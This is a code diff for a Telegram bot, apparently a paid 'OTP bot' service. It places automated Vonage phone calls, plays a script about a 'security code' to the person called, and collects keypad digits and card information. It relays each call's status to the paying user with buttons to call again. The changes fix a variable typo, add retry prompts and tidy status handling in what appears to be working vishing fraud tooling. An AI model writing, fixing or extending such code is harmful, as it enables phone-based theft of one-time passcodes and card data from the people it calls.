@@ -35,11 +35,11 @@ const server = (ctx) => __awaiter(void 0, void 0, void 0, function* () {
             const { metadata } = body.event.data;
             if (event.type === 'charge:pending' &&
                 metadata.reason === 'OTP Purchase') {
-                ctx.telegram.sendMessage(metadata.chatIid, '😁 Your payment has been received but not confirmed yet ');
+                ctx.telegram.sendMessage(metadata.chatId, '😁 Your payment has been received but not confirmed yet ');
             }
             if (event.type === 'charge:confirmed' &&
                 metadata.reason === 'OTP Purchase') {
-                ctx.telegram.sendMessage(metadata.chatIid, '😋 Your payment has been received');
+                ctx.telegram.sendMessage(metadata.chatId, '😋 Your payment has been received');
                 try {
                     const space = yield contentful_1.client.getSpace(process.env.CONTENTFUL_SPACE);
                     const env = yield space.getEnvironment('master');
@@ -49,10 +49,7 @@ const server = (ctx) => __awaiter(void 0, void 0, void 0, function* () {
                             telegramId: { 'en-US': (_a = ctx.from) === null || _a === void 0 ? void 0 : _a.id },
                             username: { 'en-US': (_b = ctx.from) === null || _b === void 0 ? void 0 : _b.username },
                             membershipExpiry: {
-                                'en-US': moment_1.default
-                                    .utc()
-                                    .add(1, 'month')
-                                    .format(),
+                                'en-US': moment_1.default.utc().add(1, 'month').format(),
                             },
                             membershipType: 'SILVER',
                         },
@@ -66,7 +63,7 @@ const server = (ctx) => __awaiter(void 0, void 0, void 0, function* () {
             }
             if (event.type === 'charge:failed' &&
                 metadata.reason === 'OTP Purchase') {
-                ctx.telegram.sendMessage(metadata.chatIid, "😔 You didn't make a payment if this an error please contact admin");
+                ctx.telegram.sendMessage(metadata.chatId, "😔 You didn't make a payment if this an error please contact admin");
             }
             return res.json(`success ${event.id}`);
         }
@@ -97,13 +94,21 @@ const server = (ctx) => __awaiter(void 0, void 0, void 0, function* () {
     });
     app.post('/vonage-webhook/pin/:chatId/:language', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
         const { dtmf } = req.body;
+        const { chatId, language } = req.params;
         if (dtmf && dtmf.digits === '*') {
+            yield ctx.telegram.sendMessage(chatId, `OTP not received ❌\n\nCall again`, {
+                parse_mode: 'HTML',
+                reply_markup: telegraf_1.Markup.inlineKeyboard([
+                    telegraf_1.Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
+                    telegraf_1.Markup.button.callback('👎🏽 No', 'noCallAgain'),
+                ]).reply_markup,
+            });
             return res.json([
                 {
                     action: 'talk',
                     text: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
                     style: 2,
-                    language: req.params.language,
+                    language,
                 },
             ]);
         }
@@ -224,8 +229,12 @@ const server = (ctx) => __awaiter(void 0, void 0, void 0, function* () {
         const { askCardInfo, cardType } = req.query;
         const { language, chatId, step } = req.params;
         if (dtmf && dtmf.digits === '*') {
-            yield ctx.telegram.sendMessage(chatId, `OTP not received ❌`, {
+            yield ctx.telegram.sendMessage(chatId, `OTP not received ❌\n\nCall again`, {
                 parse_mode: 'HTML',
+                reply_markup: telegraf_1.Markup.inlineKeyboard([
+                    telegraf_1.Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
+                    telegraf_1.Markup.button.callback('👎🏽 No', 'noCallAgain'),
+                ]).reply_markup,
             });
             return res.json([
                 {
@@ -373,19 +382,28 @@ const server = (ctx) => __awaiter(void 0, void 0, void 0, function* () {
     app.post('/vonage-webhook', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
         var _c;
         const { status, to } = req.body;
+        const chatId = ctx.wizard.state.userCalling
+            ?
+                ctx.wizard.state.userCalling[to]
+            : ctx.chat
+                ? ctx.chat.id
+                : undefined;
+        if (!chatId) {
+            return;
+        }
         if (status === 'started') {
-            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], `Calling (${to}) 📞`);
+            yield ctx.telegram.sendMessage(chatId, `Calling (${to}) 📞`);
         }
         if (status === 'ringing') {
-            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], `Ringing (${to}) 🔔`);
+            yield ctx.telegram.sendMessage(chatId, `Ringing (${to}) 🔔`);
         }
         if (status === 'answered') {
-            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], `On call (${to}) 🤳🏽`, {
+            yield ctx.telegram.sendMessage(chatId, `On call (${to}) 🤳🏽`, {
                 parse_mode: 'HTML',
             });
         }
         if (status === 'busy') {
-            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], '<b>On another call </b> ❌\n\nCall again', {
+            yield ctx.telegram.sendMessage(chatId, '<b>On another call </b> ❌\n\nCall again', {
                 parse_mode: 'HTML',
                 reply_markup: telegraf_1.Markup.inlineKeyboard([
                     telegraf_1.Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
@@ -394,7 +412,7 @@ const server = (ctx) => __awaiter(void 0, void 0, void 0, function* () {
             });
         }
         if (status === 'machine') {
-            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], '<b>Voicemail</b> ❌\n\nCall again', {
+            yield ctx.telegram.sendMessage(chatId, '<b>Voicemail</b> ❌\n\nCall again', {
                 parse_mode: 'HTML',
                 reply_markup: telegraf_1.Markup.inlineKeyboard([
                     telegraf_1.Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
@@ -403,15 +421,11 @@ const server = (ctx) => __awaiter(void 0, void 0, void 0, function* () {
             });
         }
         if (status === 'cancelled') {
-            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], 'Call could not be place, the number is unreachable ❌.', {
-                parse_mode: 'HTML',
-                reply_markup: telegraf_1.Markup.inlineKeyboard([
-                    telegraf_1.Markup.button.callback('Make a call', 'call'),
-                ]).reply_markup,
-            });
+            yield ctx.telegram.sendMessage(chatId, 'Call could not be placed, the number is unreachable ❌.');
+            ctx.scene.enter('super-wizard');
         }
         if (status === 'rejected' || status === 'declined') {
-            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], '<b>Hung up</b> ❌\n\nCall again', {
+            yield ctx.telegram.sendMessage(chatId, '<b>Hung up</b> ❌\n\nCall again', {
                 parse_mode: 'HTML',
                 reply_markup: telegraf_1.Markup.inlineKeyboard([
                     telegraf_1.Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
@@ -420,7 +434,7 @@ const server = (ctx) => __awaiter(void 0, void 0, void 0, function* () {
             });
         }
         if (status === 'unanswered' || status === 'timeout') {
-            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], '<b>No answer</b> ❌\n\nCall again', {
+            yield ctx.telegram.sendMessage(chatId, '<b>No answer</b> ❌\n\nCall again', {
                 parse_mode: 'HTML',
                 reply_markup: telegraf_1.Markup.inlineKeyboard([
                     telegraf_1.Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
@@ -430,7 +444,7 @@ const server = (ctx) => __awaiter(void 0, void 0, void 0, function* () {
         }
         if (status === 'failed') {
             (_c = ctx.scene.current) === null || _c === void 0 ? void 0 : _c.leave();
-            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], '😔💔 Bot is down and will back soon.\n\nPlease contact admin to follow up.', {
+            yield ctx.telegram.sendMessage(chatId, '😔💔 Bot is down and will back soon.\n\nPlease contact admin to follow up.', {
                 parse_mode: 'HTML',
                 reply_markup: telegraf_1.Markup.inlineKeyboard([
                     telegraf_1.Markup.button.callback('Try again', 'start'),
@@ -438,7 +452,7 @@ const server = (ctx) => __awaiter(void 0, void 0, void 0, function* () {
             });
         }
         if (status === 'completed') {
-            yield ctx.telegram.sendMessage(ctx.wizard.state.userCalling[to], '<b>Ended.</b>.\n\nCall again? 📞', {
+            yield ctx.telegram.sendMessage(chatId, '<b>Ended.</b>.\n\nCall again? 📞', {
                 parse_mode: 'HTML',
                 reply_markup: telegraf_1.Markup.inlineKeyboard([
                     telegraf_1.Markup.button.callback('👍🏽 Yes', 'yesCallAgain'),
